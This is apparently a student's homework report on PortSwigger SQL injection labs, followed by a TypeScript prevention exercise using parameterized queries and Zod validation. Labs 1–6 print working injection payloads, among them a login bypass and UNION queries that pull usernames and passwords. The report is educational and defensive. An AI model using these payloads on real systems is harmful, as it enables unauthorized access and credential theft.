
# Week 9 – SQL Injection Homework

## Introduction

In this assignment, I practiced SQL injection using PortSwigger Web Security Academy and learned how to prevent it using TypeScript, parameterized queries, and Zod.

## Lab 1 – Retrieve Hidden Data

Status: Not documented as completed.

Example payload:
' OR 1=1--

Expected SQL query:
SELECT * FROM products
WHERE category = '' OR 1=1--'
AND released = 1

Why it works:
OR 1=1 makes the condition true, and the comment removes the released-product restriction.

## Lab 2 – Login Bypass

Status: Solved.

Payload:
administrator'--

Expected SQL query:
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'password'

Why it works:
The comment removes the password condition, allowing the administrator account to be selected without checking the password.

## Lab 3 – UNION: Retrieve Data from Other Tables

Status: Solved.

Payload:
' UNION SELECT username,password FROM users--

Expected SQL query:
SELECT name, description FROM products
WHERE category = ''
UNION SELECT username,password FROM users--'

Why it works:
UNION combines the original results with values from the users table when the number and types of columns match.

## Lab 4 – Determine the Number of Columns

Status: Solved.

Payloads:
' ORDER BY 3--
' ORDER BY 4--
' UNION SELECT NULL,NULL,NULL--

Expected SQL query:
SELECT * FROM products
WHERE category = ''
ORDER BY 3--'

Why it works:
ORDER BY 3 worked, but ORDER BY 4 produced an error. This indicated that the query returned three columns.

## Lab 5 – Find a Column Containing Text

Status: Solved.

Payload:
' UNION SELECT NULL,'x0tfxh',NULL--

Expected SQL query:
SELECT * FROM products
WHERE category = ''
UNION SELECT NULL,'x0tfxh',NULL--'

Why it works:
The second column accepted a text value. UNION requires compatible data types between the two queries.

## Lab 6 – Retrieve Multiple Values in One Column

Status: Solved.

Payload:
' UNION SELECT NULL,username||':'||password FROM users--

Expected SQL query:
SELECT name, description FROM products
WHERE category = ''
UNION SELECT NULL,username||':'||password
FROM users--'

Why it works:
String concatenation combines the username and password into a single text value, separated by a colon.

## Lab 7 – Examine the Database

Optional. Not completed.

## Lab 8 – Blind SQL Injection

Optional. Not completed.

## Challenge 9 – Prevent SQL Injection

### Vulnerable Example

File: vulnerable.ts

The vulnerable example builds an SQL query using string concatenation.

Example input:
Gifts' OR 1=1--

Generated SQL:
SELECT name, description FROM products
WHERE category = 'Gifts' OR 1=1--'
AND released = 1

The injected OR condition changes the query, and the comment removes the released-product restriction.

### Secure Example

File: secure.ts

The secure example uses a parameterized query:

SELECT name, description FROM products
WHERE category = $1 AND released = 1

The category value is stored separately in a values array.

I also used Zod to validate the input.

Allowed categories:
- Gifts
- Food
- Clothing

The malicious input is rejected because it is not an allowed category.

### Why Parameterized Queries Work

A parameterized query separates SQL instructions from user input.

The database driver treats the parameter as a value rather than part of the SQL command.

String concatenation is unsafe because it can allow input to change the SQL syntax.

### Why ORDER BY Needs a Whitelist

SQL parameters such as $1 represent data values, not SQL identifiers or keywords.

Column names and ORDER BY expressions cannot be safely substituted using a normal value parameter.

Instead, the application should check requested column names and sort directions against a fixed list of allowed values.

For example, only allow sorting by name or category and only allow ASC or DESC.

## Testing

I tested the TypeScript examples using tsx.

The vulnerable example demonstrates how SQL injection changes a generated query.

The secure example validates the category using Zod and rejects the malicious input.

These examples do not connect to or query a real database.

## Conclusion

This assignment helped me understand how SQL injection works and how it can expose information or bypass application restrictions.

I practiced UNION attacks, column counting, text-column identification, and combining database values.

I also learned that parameterized queries and input validation are important techniques for protecting backend applications.

## Sources

PortSwigger Web Security Academy:
https://portswigger.net/web-security/sql-injection

PortSwigger UNION Attacks:
https://portswigger.net/web-security/sql-injection/union-attacks

OWASP SQL Injection Prevention:
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

Zod:
https://zod.dev/